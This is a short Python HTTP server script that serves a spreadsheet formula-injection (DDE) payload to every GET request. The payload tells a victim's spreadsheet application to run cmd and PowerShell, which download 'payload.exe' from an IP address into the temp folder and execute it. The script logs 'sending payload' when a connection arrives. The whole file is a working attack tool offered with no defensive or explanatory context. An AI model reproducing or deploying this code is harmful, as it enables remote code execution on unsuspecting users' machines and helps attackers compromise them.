from http.server import BaseHTTPRequestHandler,HTTPServer

class S(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/plain')
		self.send_header('Last-Modified','Wed,12 Sep 2018 07:06:21 GMT')
		self.end_headers()
	def _send_404(self):
		self.send_response(404)
		self.end_headers()
	def do_GET(self):
		self._set_headers()
		self.wfile.write(b"=cmd|'/c powershell -command \"& {iwr http://192.168.1.104/payload.exe?dl=1 -OutFile $env:Temp\payload.exe}\";cmd /c %temp%\payload.exe'!A1,")
		print("Connection accepted - sending payload")

def run(server_class=HTTPServer, handler_class=S, port=80):
	server_address = ('',port)
	httpd = server_class(server_address,handler_class)
	print("Starting httpd. . . . . .")
	httpd.serve_forever()
	
if __name__ == "__main__":
	from sys import argv
	
	if len(argv) == 2:
		run(port=int(argv[1]))
	else:
		run()
